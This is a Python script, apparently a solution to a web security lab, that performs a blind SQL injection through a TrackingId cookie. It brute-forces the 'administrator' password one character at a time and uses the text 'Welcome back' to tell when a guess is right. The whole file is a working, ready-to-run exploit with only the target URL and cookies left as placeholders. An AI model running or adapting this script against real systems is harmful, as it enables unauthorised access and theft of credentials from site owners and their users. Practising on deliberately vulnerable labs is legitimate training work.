import requests
import string

URL = "CHANGE_ME"
SESSION_COOKIE = "CHANGE_ME"
TRACKING_ID = "CHANGE_ME"
PASSWORD_LENGTH = 20
CHARS = string.ascii_lowercase + string.digits
SUCCESS_TEXT = "Welcome back"

def check_char(position, char):
    payload = f"{TRACKING_ID}' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{position},1)='{char}"
    cookies = {"TrackingId": payload, "session": SESSION_COOKIE}
    response = requests.get(URL, cookies=cookies)
    return SUCCESS_TEXT in response.text

def extract_password():
    password = ""
    for position in range(1, PASSWORD_LENGTH + 1):
        for char in CHARS:
            print(f"[*] Position {position}: trying '{char}'", end="\r")
            if check_char(position, char):
                password += char
                print(f"[+] Position {position}: '{char}' ✓")
                break
    return password

if __name__ == "__main__":
    password = extract_password()
    print(f"\n[+] Password: {password}")
